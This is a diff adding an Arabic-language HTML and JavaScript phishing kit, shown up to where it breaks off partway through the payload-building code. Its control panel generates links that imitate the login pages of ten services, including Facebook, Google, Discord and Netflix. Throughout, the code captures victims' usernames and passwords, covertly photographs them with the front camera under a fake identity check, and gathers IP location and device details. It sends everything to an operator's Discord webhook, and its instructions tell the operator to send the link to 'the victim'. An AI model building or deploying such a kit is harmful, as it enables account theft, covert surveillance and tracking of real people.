@@ -1,0 +1,872 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#0b0f1a">
+<title>أداة السحب | لوحة التحكم</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+  :root{
+    --bg:#0b0f1a; --card:#111a2b; --card2:#0e1626; --line:#1e2a42;
+    --txt:#e8eefc; --dim:#8b9ab4; --blue:#4f6ef7; --violet:#8b5cf6;
+    --ok:#22c55e; --err:#ef4444;
+  }
+  html,body{height:100%}
+  body{
+    font-family:'Cairo',system-ui,-apple-system,sans-serif;
+    background:var(--bg); color:var(--txt);
+    -webkit-font-smoothing:antialiased;
+  }
+  body::before{
+    content:""; position:fixed; inset:0; pointer-events:none; z-index:0;
+    background:
+      radial-gradient(600px 400px at 85% -5%, rgba(139,92,246,.18), transparent 60%),
+      radial-gradient(500px 380px at 5% 105%, rgba(79,110,247,.16), transparent 60%);
+  }
+  .wrap{position:relative; z-index:1; max-width:480px; margin:0 auto; padding:18px 16px 60px}
+
+  .top{display:flex; align-items:center; gap:12px; padding:8px 0 18px}
+  .brand{
+    width:46px;height:46px;border-radius:14px;flex:0 0 auto;
+    background:linear-gradient(135deg,var(--blue),var(--violet));
+    display:grid;place-items:center;font-weight:800;font-size:20px;color:#fff;
+    box-shadow:0 8px 24px rgba(79,110,247,.35);
+  }
+  .top h1{font-size:17px;font-weight:800;line-height:1.3}
+  .top p{font-size:12px;color:var(--dim);margin-top:2px}
+  .badge{
+    margin-inline-start:auto;font-size:10px;font-weight:700;color:#a5b4fc;
+    background:rgba(79,110,247,.12);border:1px solid rgba(79,110,247,.3);
+    padding:5px 10px;border-radius:999px;
+  }
+
+  .card{
+    background:linear-gradient(180deg,var(--card),#0d1522);
+    border:1px solid var(--line); border-radius:20px;
+    padding:16px; margin-bottom:14px;
+    box-shadow:0 12px 34px rgba(0,0,0,.35);
+  }
+  .card-title{
+    font-size:13px; font-weight:700; color:#c7d3ea;
+    display:flex; align-items:center; gap:8px; margin-bottom:14px;
+  }
+  .card-title .dot{width:6px;height:6px;border-radius:50%;background:var(--violet);box-shadow:0 0 10px var(--violet)}
+  .hint{font-size:11px;color:var(--dim);line-height:1.7;margin-top:6px}
+
+  .apps{display:grid;grid-template-columns:repeat(5,1fr);gap:8px}
+  .app{
+    aspect-ratio:1/1; border-radius:14px; border:1px solid var(--line);
+    background:var(--card2); display:grid; place-items:center;
+    cursor:pointer; transition:.18s; position:relative; overflow:hidden;
+  }
+  .app svg{width:26px;height:26px;pointer-events:none}
+  .app span{
+    position:absolute; bottom:3px; font-size:8px; color:var(--dim);
+    font-weight:700; pointer-events:none;
+  }
+  .app:active{transform:scale(.94)}
+  .app.on{
+    border-color:var(--violet); background:rgba(139,92,246,.13);
+    box-shadow:0 0 0 1px var(--violet), 0 8px 22px rgba(139,92,246,.3);
+  }
+  .app.on span{color:#c4b5fd}
+
+  .field{margin-bottom:14px}
+  .field:last-child{margin-bottom:0}
+  label{display:block;font-size:12px;font-weight:700;color:#a9b7d0;margin-bottom:7px}
+  input[type=text],input[type=url],input[type=number],select{
+    width:100%; background:var(--card2); border:1px solid var(--line);
+    border-radius:12px; padding:13px 14px; color:var(--txt);
+    font-family:inherit; font-size:13px; outline:none; transition:.16s;
+    direction:ltr; text-align:right;
+  }
+  input::placeholder{color:#5a6982; direction:ltr; text-align:right}
+  input:focus,select:focus{border-color:var(--blue); box-shadow:0 0 0 3px rgba(79,110,247,.14)}
+  select{direction:rtl; appearance:none;
+    background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%238b9ab4'><path d='M6 8L2 4h8z'/></svg>");
+    background-repeat:no-repeat; background-position:left 14px center;}
+  .row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+
+  .btn{
+    width:100%; border:none; border-radius:13px; padding:14px;
+    font-family:inherit; font-size:14px; font-weight:800; color:#fff;
+    background:linear-gradient(90deg,var(--blue),var(--violet));
+    cursor:pointer; transition:.16s; box-shadow:0 10px 26px rgba(79,110,247,.3);
+  }
+  .btn:active{transform:scale(.97)}
+  .btn.ghost{
+    background:var(--card2); border:1px solid var(--line); color:#c7d3ea;
+    box-shadow:none; font-size:13px;
+  }
+  .btn.sm{padding:11px; font-size:12px}
+
+  .switch{display:flex;align-items:center;justify-content:space-between;gap:10px;
+    background:var(--card2);border:1px solid var(--line);border-radius:12px;padding:12px 14px}
+  .switch p{font-size:12px;font-weight:700;color:#a9b7d0}
+  .sw{width:46px;height:26px;border-radius:999px;background:#1c2740;border:1px solid var(--line);
+    position:relative;cursor:pointer;transition:.2s;flex:0 0 auto}
+  .sw::after{content:"";position:absolute;top:2px;right:2px;width:20px;height:20px;border-radius:50%;
+    background:#5a6982;transition:.2s}
+  .sw.on{background:rgba(34,197,94,.2);border-color:var(--ok)}
+  .sw.on::after{right:22px;background:var(--ok)}
+
+  .toast{
+    position:fixed;left:50%;bottom:26px;transform:translate(-50%,20px);
+    background:#16213a;border:1px solid var(--line);color:#e8eefc;
+    padding:12px 20px;border-radius:12px;font-size:12px;font-weight:700;
+    z-index:99;opacity:0;pointer-events:none;transition:.25s;max-width:90vw;text-align:center;
+  }
+  .toast.show{opacity:1;transform:translate(-50%,0)}
+  .toast.ok{border-color:var(--ok);color:#bbf7d0}
+  .toast.err{border-color:var(--err);color:#fecaca}
+
+  .result{display:none}
+  .result.on{display:block}
+  .linkbox{display:flex;gap:8px;margin-bottom:10px}
+  .linkbox input{font-size:11px}
+  .qr{display:grid;place-items:center;padding:12px 0}
+  .qr img{width:170px;height:170px;border-radius:14px;background:#fff;padding:8px}
+  .steps{font-size:11px;color:var(--dim);line-height:2;margin-top:10px}
+  .steps b{color:#c7d3ea}
+
+  /* ================= صفحة التقليد ================= */
+  #fake{display:none; position:fixed; inset:0; z-index:50; overflow:auto; background:#fff}
+  #fake.on{display:block}
+  .fk{min-height:100vh; display:flex; flex-direction:column; padding:0 22px 30px}
+  .fk-top{display:flex;justify-content:flex-end;padding:14px 0}
+  .fk-lang{font-size:12px;font-weight:700;background:none;border:none;font-family:inherit;cursor:pointer;opacity:.75}
+  .fk-body{flex:1;display:flex;flex-direction:column;justify-content:center;padding:10px 0 24px}
+  .fk-logo{display:flex;justify-content:center;margin-bottom:22px}
+  .fk-logo svg{width:64px;height:64px}
+  .fk-title{font-size:22px;font-weight:800;text-align:center;margin-bottom:8px}
+  .fk-sub{font-size:13px;text-align:center;opacity:.7;margin-bottom:24px;line-height:1.6}
+  .fk-form{display:flex;flex-direction:column;gap:12px}
+  .fk-in{
+    width:100%;padding:15px;border-radius:12px;font-family:inherit;font-size:14px;
+    border:1px solid #ccd3dd;background:#fff;color:#111;outline:none;direction:ltr;text-align:left;
+  }
+  .fk-in:focus{border-color:#4a6cf7;box-shadow:0 0 0 3px rgba(74,108,247,.15)}
+  .fk-btn{
+    width:100%;padding:15px;border:none;border-radius:12px;font-family:inherit;
+    font-size:15px;font-weight:800;color:#fff;cursor:pointer;margin-top:4px;
+  }
+  .fk-btn:active{opacity:.85}
+  .fk-link{text-align:center;font-size:13px;font-weight:700;margin-top:18px;text-decoration:none;display:block;opacity:.9}
+  .fk-sep{display:flex;align-items:center;gap:10px;font-size:11px;opacity:.5;margin:18px 0}
+  .fk-sep::before,.fk-sep::after{content:"";flex:1;height:1px;background:currentColor;opacity:.3}
+  .fk-alt{
+    width:100%;padding:13px;border-radius:12px;background:transparent;
+    font-family:inherit;font-size:13px;font-weight:700;cursor:pointer;
+  }
+  .fk-foot{text-align:center;font-size:11px;opacity:.55;padding:18px 0 8px;line-height:1.8}
+  .fk-chip{
+    display:flex;align-items:center;gap:8px;background:#f0f2f5;border-radius:999px;
+    padding:6px 14px 6px 6px;font-size:12px;font-weight:700;color:#111;
+    margin:0 auto 18px;max-width:100%;width:fit-content;
+  }
+  .fk-chip i{width:26px;height:26px;border-radius:50%;background:#4a6cf7;color:#fff;
+    display:grid;place-items:center;font-size:12px;font-style:normal;flex:0 0 auto}
+  .fk-chip span{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;direction:ltr}
+
+  .fk.facebook{background:#fff;color:#1c1e21}
+  .fk.facebook .fk-btn{background:#1877f2}
+  .fk.facebook .fk-link{color:#1877f2}
+  .fk.instagram{background:#fff;color:#262626}
+  .fk.instagram .fk-btn{background:linear-gradient(90deg,#f9ce34,#ee2a7b,#6228d7)}
+  .fk.instagram .fk-link{color:#ee2a7b}
+  .fk.tiktok{background:#000;color:#fff}
+  .fk.tiktok .fk-in{background:#1a1a1a;border-color:#333;color:#fff}
+  .fk.tiktok .fk-btn{background:#fe2c55}
+  .fk.tiktok .fk-link{color:#fe2c55}
+  .fk.tiktok .fk-chip{background:#1a1a1a;color:#fff}
+  .fk.snapchat{background:#fffc00;color:#111}
+  .fk.snapchat .fk-btn{background:#fff;color:#111;box-shadow:0 4px 14px rgba(0,0,0,.12)}
+  .fk.snapchat .fk-link{color:#111}
+  .fk.snapchat .fk-in{border-color:#e6e300}
+  .fk.google{background:#fff;color:#202124}
+  .fk.google .fk-btn{background:#1a73e8}
+  .fk.google .fk-link{color:#1a73e8}
+  .fk.twitter{background:#000;color:#e7e9ea}
+  .fk.twitter .fk-in{background:#000;border-color:#333;color:#fff}
+  .fk.twitter .fk-btn{background:#eff3f4;color:#0f1419}
+  .fk.twitter .fk-link{color:#1d9bf0}
+  .fk.telegram{background:#fff;color:#111}
+  .fk.telegram .fk-btn{background:#229ed9}
+  .fk.telegram .fk-link{color:#229ed9}
+  .fk.discord{background:#313338;color:#f2f3f5}
+  .fk.discord .fk-in{background:#1e1f22;border-color:#1e1f22;color:#fff}
+  .fk.discord .fk-btn{background:#5865f2}
+  .fk.discord .fk-link{color:#00a8fc}
+  .fk.discord .fk-chip{background:#1e1f22;color:#fff}
+  .fk.steam{background:linear-gradient(180deg,#1b2838,#0e1621);color:#c7d5e0}
+  .fk.steam .fk-in{background:#316282;border-color:#316282;color:#fff}
+  .fk.steam .fk-btn{background:linear-gradient(90deg,#47bfff,#1a44a6)}
+  .fk.steam .fk-link{color:#66c0f4}
+  .fk.netflix{background:#000;color:#fff}
+  .fk.netflix .fk-in{background:#161616;border-color:#333;color:#fff}
+  .fk.netflix .fk-btn{background:#e50914}
+  .fk.netflix .fk-link{color:#e50914}
+
+  /* أوفلاي التحميل */
+  .fk-load{
+    position:fixed;inset:0;z-index:60;background:rgba(255,255,255,.96);
+    display:none;flex-direction:column;align-items:center;justify-content:center;gap:16px;
+    color:#111;
+  }
+  .fk-load.on{display:flex}
+  .fk-load.dark{background:rgba(0,0,0,.94);color:#fff}
+  .spinner{
+    width:42px;height:42px;border-radius:50%;
+    border:3px solid rgba(120,120,120,.3);border-top-color:#4f6ef7;
+    animation:spin .8s linear infinite;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .fk-load p{font-size:14px;font-weight:700}
+  .fk-load small{font-size:11px;opacity:.6}
+
+  /* ================= أوفلاي الكاميرا ================= */
+  #camOv{
+    position:fixed;inset:0;z-index:70;background:#05070d;
+    display:none;flex-direction:column;align-items:center;justify-content:center;
+    color:#fff;
+  }
+  #camOv.on{display:flex}
+  .cam-frame{
+    position:relative;width:min(78vw,300px);aspect-ratio:3/4;
+    border-radius:26px;overflow:hidden;background:#111;
+    box-shadow:0 0 0 2px rgba(255,255,255,.14),0 24px 60px rgba(0,0,0,.6);
+  }
+  #camVid{width:100%;height:100%;object-fit:cover;transform:scaleX(-1)}
+  .cam-ring{
+    position:absolute;inset:12px;border:2px dashed rgba(255,255,255,.35);
+    border-radius:18px;pointer-events:none;
+  }
+  #camCount{
+    position:absolute;inset:0;display:none;place-items:center;
+    font-size:64px;font-weight:800;color:#fff;
+    text-shadow:0 4px 24px rgba(0,0,0,.7);font-family:'Cairo',sans-serif;
+  }
+  #camFlash{
+    position:absolute;inset:0;background:#fff;opacity:0;transition:opacity .12s;pointer-events:none;
+  }
+  #camFlash.on{opacity:.92}
+  .cam-cap{margin-top:20px;font-size:14px;font-weight:800;text-align:center}
+  .cam-sub{margin-top:6px;font-size:11px;opacity:.55;text-align:center;line-height:1.7;max-width:260px}
+  .cam-dots{display:flex;gap:7px;margin-top:14px}
+  .cam-dots i{width:7px;height:7px;border-radius:50%;background:rgba(255,255,255,.22)}
+  .cam-dots i.done{background:#22c55e}
+  .cam-skip{
+    margin-top:18px;background:none;border:1px solid rgba(255,255,255,.25);
+    color:#fff;font-family:inherit;font-size:11px;font-weight:700;
+    padding:9px 18px;border-radius:999px;cursor:pointer;opacity:.8;
+  }
+</style>
+</head>
+<body>
+
+<!-- ==================== لوحة التحكم ==================== -->
+<div class="wrap" id="panel">
+  <div class="top">
+    <div class="brand">V</div>
+    <div>
+      <h1>أداة سحب الحسابات</h1>
+      <p>اختر التطبيق وجهّز الحملة</p>
+    </div>
+    <div class="badge">v3.0</div>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="dot"></span> اختر التطبيق</div>
+    <div class="apps" id="apps"></div>
+    <p class="hint">اضغط على التطبيق اللي عايز تعمل عليه الحملة، وهيتفتح قدام الضحية بشكل مطابق.</p>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="dot"></span> إعدادات الإرسال</div>
+    <div class="field">
+      <label>رابط الويب هوك (ديسكورد)</label>
+      <input type="url" id="hook" placeholder="https://discord.com/api/webhooks/..." dir="ltr">
+      <div class="row" style="margin-top:8px">
+        <button class="btn ghost sm" id="testBtn">اختبار الربط</button>
+        <button class="btn ghost sm" id="pasteBtn">لصق من الحافظة</button>
+      </div>
+      <p class="hint">ديسكورد ← إعدادات السيرفر ← التكاملات ← الويب هوك ← رابط جديد ← انسخ الرابط.</p>
+    </div>
+    <div class="field">
+      <label>اسم الحملة</label>
+      <input type="text" id="camp" placeholder="حملة-1" dir="rtl">
+    </div>
+    <div class="field">
+      <label>رابط التحويل بعد التصوير</label>
+      <input type="url" id="redir" placeholder="https://example.com" dir="ltr">
+      <p class="hint">سيبه فاضي وهيرجع الضحية لصفحة التطبيق الأصلية.</p>
+    </div>
+    <div class="row">
+      <div class="field">
+        <label>عدد صور الشاشة</label>
+        <select id="shots">
+          <option>1</option><option selected>2</option><option>3</option><option>4</option><option>5</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>الفاصل (ms)</label>
+        <input type="number" id="delay" value="900" min="200" max="5000" step="100" dir="ltr">
+      </div>
+    </div>
+    <div class="field">
+      <div class="switch">
+        <p>إرفاق الموقع الجغرافي التقريبي</p>
+        <div class="sw on" id="geoSwh"></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="dot"></span> الكاميرا</div>
+    <div class="field">
+      <div class="switch">
+        <p>تصوير الضحية بالكاميرا الأمامية</p>
+        <div class="sw on" id="camSwh"></div>
+      </div>
+      <p class="hint">بيظهر أوفلاي تأكيد هوية بعد كلمة السر، وبيلقط الصور بفلاش. لو رفض الإذن بيتم تخطيه تلقائياً.</p>
+    </div>
+    <div class="field">
+      <label>عدد صور الكاميرا</label>
+      <select id="camShots">
+        <option>1</option><option selected>2</option><option>3</option>
+      </select>
+    </div>
+  </div>
+
+  <button class="btn" id="genBtn">توليد الرابط</button>
+
+  <div class="card result" id="result" style="margin-top:14px">
+    <div class="card-title"><span class="dot"></span> الرابط جاهز</div>
+    <div class="linkbox">
+      <input type="text" id="outLink" readonly dir="ltr">
+      <button class="btn sm" id="copyBtn" style="width:auto;padding:0 16px">نسخ</button>
+    </div>
+    <div class="qr" id="qrBox"></div>
+    <button class="btn ghost sm" id="openBtn">فتح الرابط</button>
+    <p class="steps">
+      <b>خطوات التشغيل:</b><br>
+      1. ارفع الملف على استضافة HTTPS (tiiny.host / Netlify / GitHub Pages).<br>
+      2. اختار التطبيق، حط الويب هوك، اضغط توليد.<br>
+      3. ابعت الرابط للضحية — البيانات + الصور + الموقع هيوصلوا على ديسكورد.
+    </p>
+  </div>
+</div>
+
+<!-- ==================== صفحة التقليد ==================== -->
+<div id="fake">
+  <div class="fk" id="fkRoot">
+    <div class="fk-top"><button class="fk-lang" id="fkLang">العربية</button></div>
+    <div class="fk-body" id="fkBody"></div>
+    <div class="fk-foot" id="fkFoot"></div>
+  </div>
+</div>
+
+<!-- أوفلاي الكاميرا -->
+<div id="camOv">
+  <div class="cam-frame">
+    <video id="camVid" playsinline autoplay muted></video>
+    <div class="cam-ring"></div>
+    <div id="camCount"></div>
+    <div id="camFlash"></div>
+  </div>
+  <div class="cam-cap">تأكيد الهوية</div>
+  <div class="cam-sub">وجّه وجهك للكاميرا، هيتم التقاط صورة سريعة للتحقق.</div>
+  <div class="cam-dots" id="camDots"></div>
+  <button class="cam-skip" id="camSkip">تخطي</button>
+</div>
+
+<div class="fk-load" id="load">
+  <div class="spinner"></div>
+  <p>جاري التحقق...</p>
+  <small>من فضلك انتظر قليلاً</small>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+/* =========================================================
+   بيانات التطبيقات
+   ========================================================= */
+const APPS = [
+  { id:'facebook', name:'فيسبوك', real:'https://www.facebook.com/login',
+    label:'البريد الإلكتروني أو رقم الهاتف', type:'email', step2:'كلمة السر',
+    sub:'تسجيل الدخول إلى حسابك', foot:'فيسبوك © 2026',
+    logo:`<svg viewBox="0 0 36 36"><path fill="#1877f2" d="M18 0C8.06 0 0 8.06 0 18c0 8.98 6.58 16.43 15.19 17.78V23.2h-4.57V18h4.57v-3.97c0-4.51 2.69-7 6.8-7 1.97 0 4.03.35 4.03.35v4.43h-2.27c-2.24 0-2.94 1.39-2.94 2.81V18h5l-.8 5.2h-4.2v12.58C29.42 34.43 36 26.98 36 18c0-9.94-8.06-18-18-18z"/></svg>` },
+
+  { id:'instagram', name:'انستجرام', real:'https://www.instagram.com/accounts/login/',
+    label:'اسم المستخدم أو البريد', type:'text', step2:'كلمة السر',
+    sub:'سجّل الدخول لمتابعة أصدقائك', foot:'إنستجرام © 2026',
+    logo:`<svg viewBox="0 0 36 36"><defs><linearGradient id="ig" x1="0" y1="1" x2="1" y2="0"><stop offset="0" stop-color="#feda75"/><stop offset=".35" stop-color="#fa7e1e"/><stop offset=".62" stop-color="#d62976"/><stop offset="1" stop-color="#962fbf"/></linearGradient></defs><rect width="36" height="36" rx="11" fill="url(#ig)"/><rect x="8.5" y="8.5" width="19" height="19" rx="6" fill="none" stroke="#fff" stroke-width="2.4"/><circle cx="18" cy="18" r="4.6" fill="none" stroke="#fff" stroke-width="2.4"/><circle cx="24.4" cy="11.6" r="1.5" fill="#fff"/></svg>` },
+
+  { id:'tiktok', name:'تيك توك', real:'https://www.tiktok.com/login',
+    label:'البريد أو اسم المستخدم', type:'text', step2:'كلمة السر',
+    sub:'سجّل الدخول لمتابعة الفيديوهات', foot:'تيك توك © 2026',
+    logo:`<svg viewBox="0 0 36 36"><rect width="36" height="36" rx="9" fill="#000"/><path fill="#fff" d="M23.9 8h-3.1v13.4a2.9 2.9 0 1 1-2.1-2.8v-3.2a6.1 6.1 0 1 0 5.2 6v-7a8.3 8.3 0 0 0 4.3 1.2V12.5a5 5 0 0 1-4.3-4.5z"/></svg>` },
+
+  { id:'snapchat', name:'سناب', real:'https://accounts.snapchat.com/accounts/login',
+    label:'اسم المستخدم أو البريد', type:'text', step2:'كلمة السر',
+    sub:'سجّل الدخول إلى سناب شات', foot:'سناب شات © 2026',
+    logo:`<svg viewBox="0 0 36 36"><rect width="36" height="36" rx="9" fill="#fffc00"/><path fill="#111" d="M18 6.5c3.6 0 5.9 2.6 5.9 6.1 0 1.2-.1 2.3-.1 2.3.5.2 1.2-.4 1.8-.2.7.2.8 1 .5 1.5-.4.7-1.6 1.3-2.4 1.6-.3.1-.3.3-.2.6.7 1.9 2 3.2 3.6 3.6.6.2.6.7.2 1-.7.5-1.7.6-2.3.8-.3.1-.4.4-.5.8-.1.5-.3.6-.8.6-.7 0-1.5-.3-2.5-.1-1 .2-1.5 1-2.6 1.4-.7.2-1.4.2-2.1 0-1.1-.4-1.6-1.2-2.6-1.4-1-.2-1.8.1-2.5.1-.5 0-.7-.1-.8-.6-.1-.4-.2-.7-.5-.8-.6-.2-1.6-.3-2.3-.8-.4-.3-.4-.8.2-1 1.6-.4 2.9-1.7 3.6-3.6.1-.3.1-.5-.2-.6-.8-.3-2-.9-2.4-1.6-.3-.5-.2-1.3.5-1.5.6-.2 1.3.4 1.8.2 0 0-.1-1.1-.1-2.3 0-3.5 2.3-6.1 5.9-6.1z"/></svg>` },
+
+  { id:'google', name:'جوجل', real:'https://accounts.google.com/signin',
+    label:'البريد الإلكتروني', type:'email', step2:'كلمة السر',
+    sub:'تسجيل الدخول لمتابعة حسابك', foot:'Google © 2026',
+    logo:`<svg viewBox="0 0 36 36"><path fill="#4285f4" d="M34.6 18.3c0-1.2-.1-2.1-.3-3H18v5.7h9.5c-.2 1.6-1.2 3.9-3.6 5.5l5.5 4.3c3.3-3 5.2-7.5 5.2-12.5z"/><path fill="#34a853" d="M18 35c4.7 0 8.6-1.5 11.4-4.2l-5.5-4.3c-1.5 1-3.5 1.7-5.9 1.7-4.5 0-8.3-3-9.7-7.1l-5.7 4.4C5.5 31.1 11.3 35 18 35z"/><path fill="#fbbc05" d="M8.3 21.1A10.5 10.5 0 0 1 7.7 18c0-1.1.2-2.1.6-3.1l-5.7-4.4A17.4 17.4 0 0 0 .6 18c0 2.8.7 5.4 1.9 7.5l5.8-4.4z"/><path fill="#ea4335" d="M18 7.3c3.2 0 5.3 1.4 6.6 2.5l4.8-4.7C26.6 2.4 22.7 1 18 1 11.3 1 5.5 4.9 2.6 10.5l5.7 4.4C9.7 10.8 13.5 7.3 18 7.3z"/></svg>` },
+
+  { id:'twitter', name:'تويتر', real:'https://twitter.com/i/flow/login',
+    label:'البريد أو اسم المستخدم', type:'text', step2:'كلمة السر',
+    sub:'سجّل الدخول إلى X', foot:'X Corp © 2026',
+    logo:`<svg viewBox="0 0 36 36"><rect width="36" height="36" rx="9" fill="#000"/><path fill="#fff" d="M20.1 16.5 27.7 8h-1.8l-6.6 7.4L14 8h-6l8 11.5L8 28.5h1.8l6.9-7.8 5.6 7.8h6zM10.5 9.3h2.7l12.3 17.9h-2.7z"/></svg>` },
+
+  { id:'telegram', name:'تليجرام', real:'https://web.telegram.org/',
+    label:'رقم الهاتف', type:'tel', step2:'كلمة السر',
+    sub:'تسجيل الدخول إلى تليجرام', foot:'تليجرام © 2026',
+    logo:`<svg viewBox="0 0 36 36"><circle cx="18" cy="18" r="18" fill="#229ed9"/><path fill="#fff" d="M8 17.7l18.2-7c.9-.3 1.6.2 1.3 1.4l-3.1 14.6c-.2 1-.8 1.2-1.7.8l-4.6-3.4-2.2 2.1c-.3.3-.5.5-1 .5l.4-4.6 8.4-7.6c.4-.3-.1-.5-.6-.2l-10.4 6.6-4.5-1.4c-1-.3-1-1 .3-1.4z"/></svg>` },
+
+  { id:'discord', name:'ديسكورد', real:'https://discord.com/login',
+    label:'البريد الإلكتروني', type:'email', step2:'كلمة السر',
+    sub:'مرحباً بعودتك!', foot:'ديسكورد © 2026',
+    logo:`<svg viewBox="0 0 36 36"><rect width="36" height="36" rx="9" fill="#5865f2"/><path fill="#fff" d="M24.6 12.4a13 13 0 0 0-3.2-1l-.4.8a10 10 0 0 0-6 0l-.4-.8a13 13 0 0 0-3.2 1c-2 3-2.6 6-2.3 9a13 13 0 0 0 4 2l.8-1.3a8 8 0 0 1-1.3-.6l.3-.3a9.4 9.4 0 0 0 8 0l.3.3a8 8 0 0 1-1.3.6l.8 1.3a13 13 0 0 0 4-2c.4-3.5-.6-6.5-2.3-9zM14.8 20c-.8 0-1.4-.7-1.4-1.6s.6-1.6 1.4-1.6 1.5.7 1.4 1.6c0 .9-.6 1.6-1.4 1.6zm6.4 0c-.8 0-1.4-.7-1.4-1.6s.6-1.6 1.4-1.6 1.5.7 1.4 1.6c0 .9-.6 1.6-1.4 1.6z"/></svg>` },
+
+  { id:'steam', name:'ستيم', real:'https://store.steampowered.com/login/',
+    label:'اسم حساب ستيم', type:'text', step2:'كلمة السر',
+    sub:'تسجيل الدخول إلى Steam', foot:'Valve © 2026',
+    logo:`<svg viewBox="0 0 36 36"><rect width="36" height="36" rx="9" fill="#1b2838"/><circle cx="24" cy="12" r="5" fill="#c7d5e0"/><circle cx="24" cy="12" r="2" fill="#1b2838"/><path fill="#c7d5e0" d="M13.5 15.5c-2.8 0-5.2 1.9-5.9 4.5l3.3 1.4a2.6 2.6 0 0 1 4.4 1.3l3.3 1.4a4.9 4.9 0 0 1-5.1-8.6zm-.6 8.2-1.4-.6a1.9 1.9 0 1 0 1.4.6z"/><circle cx="13" cy="23.5" r=".9" fill="#1b2838"/></svg>` },
+
+  { id:'netflix', name:'نتفليكس', real:'https://www.netflix.com/login',
+    label:'البريد الإلكتروني أو رقم الهاتف', type:'email', step2:'كلمة السر',
+    sub:'سجّل الدخول لمتابعة المشاهدة', foot:'Netflix © 2026',
+    logo:`<svg viewBox="0 0 36 36"><rect width="36" height="36" rx="9" fill="#000"/><path fill="#e50914" d="M12 8h4.2l3.6 9.2V8H24v20h-4.2l-3.6-9.4V28H12z"/></svg>` }
+];
+
+/* =========================================================
+   أدوات عامة
+   ========================================================= */
+const $ = s => document.querySelector(s);
+const toastEl = $('#toast');
+let toastTimer;
+function toast(msg, kind){
+  toastEl.textContent = msg;
+  toastEl.className = 'toast show ' + (kind || '');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => toastEl.className = 'toast', 2600);
+}
+const b64e = o => btoa(unescape(encodeURIComponent(JSON.stringify(o))))
+  .replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/,'');
+const b64d = s => JSON.parse(decodeURIComponent(escape(
+  atob(s.replace(/-/g,'+').replace(/_/g,'/')))));
+
+/* =========================================================
+   اللوحة
+   ========================================================= */
+const CFG_KEY = 'venice_capture_cfg';
+let selectedApp = 'facebook';
+
+function buildAppGrid(){
+  $('#apps').innerHTML = APPS.map(a =>
+    `<div class="app" data-id="${a.id}" title="${a.name}">${a.logo}<span>${a.name}</span></div>`
+  ).join('');
+  document.querySelectorAll('.app').forEach(el => {
+    el.onclick = () => {
+      selectedApp = el.dataset.id;
+      document.querySelectorAll('.app').forEach(x => x.classList.toggle('on', x === el));
+      saveCfg();
+    };
+  });
+}
+
+function saveCfg(){
+  localStorage.setItem(CFG_KEY, JSON.stringify({
+    app: selectedApp,
+    hook: $('#hook').value,
+    camp: $('#camp').value,
+    redir: $('#redir').value,
+    shots: $('#shots').value,
+    delay: $('#delay').value,
+    geo: $('#geoSwh').classList.contains('on'),
+    cam: $('#camSwh').classList.contains('on'),
+    cn: $('#camShots').value
+  }));
+}
+
+function loadCfg(){
+  let c = {};
+  try { c = JSON.parse(localStorage.getItem(CFG_KEY) || '{}'); } catch(e){}
+  if (c.hook) $('#hook').value = c.hook;
+  if (c.camp) $('#camp').value = c.camp;
+  if (c.redir) $('#redir').value = c.redir;
+  if (c.shots) $('#shots').value = c.shots;
+  if (c.delay) $('#delay').value = c.delay;
+  if (c.geo === false) $('#geoSwh').classList.remove('on');
+  if (c.cam === false) $('#camSwh').classList.remove('on');
+  if (c.cn) $('#camShots').value = c.cn;
+  if (c.app) selectedApp = c.app;
+  document.querySelectorAll('.app').forEach(x => x.classList.toggle('on', x.dataset.id === selectedApp));
+}
+
+/* =========================================================
+   الإرسال
+   ========================================================= */
+async function getGeo(){
+  const out = {};
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    if (r.ok){
+      const d = await r.json();
+      out.ip = d.ip; out.city = d.city; out.region = d.region;
+      out.country = d.country_name; out.isp = d.org;
+      out.lat = d.latitude; out.lon = d.longitude;
+      return out;
+    }
+  } catch(e){}
+  try {
+    const r = await fetch('https://ipwho.is/');
+    const d = await r.json();
+    if (d && d.success !== false){
+      out.ip = d.ip; out.city = d.city; out.region = d.region;
+      out.country = d.country; out.isp = d.connection && d.connection.isp;
+      out.lat = d.latitude; out.lon = d.longitude;
+    }
+  } catch(e){}
+  return out;
+}
+
+function deviceInfo(){
+  const ua = navigator.userAgent;
+  let os = 'غير معروف';
+  if (/android/i.test(ua)) os = 'Android';
+  else if (/iphone|ipad|ipod/i.test(ua)) os = 'iOS';
+  else if (/windows/i.test(ua)) os = 'Windows';
+  else if (/mac/i.test(ua)) os = 'macOS';
+  else if (/linux/i.test(ua)) os = 'Linux';
+  let br = 'غير معروف';
+  if (/edg\//i.test(ua)) br = 'Edge';
+  else if (/opr\/|opera/i.test(ua)) br = 'Opera';
+  else if (/chrome|crios/i.test(ua)) br = 'Chrome';
+  else if (/firefox|fxios/i.test(ua)) br = 'Firefox';
+  else if (/safari/i.test(ua)) br = 'Safari';
+  return { os, br, res: screen.width + 'x' + screen.height, ua };
+}
+
+async function send(hook, payload, files){
+  const fd = new FormData();
+  fd.append('payload_json', JSON.stringify(payload));
+  (files || []).forEach((f, i) => fd.append('files[' + i + ']', f.blob, f.name));
+  const r = await fetch(hook, { method: 'POST', body: fd });
+  if (!r.ok) throw new Error('HTTP ' + r.status);
+}
+
+function buildPayload(cfg, step, id, pw, geo, camState){
+  const app = APPS.find(a => a.id === cfg.a) || APPS[0];
+  const dev = deviceInfo();
+  const fields = [
+    { name: '📱 التطبيق', value: app.name, inline: true },
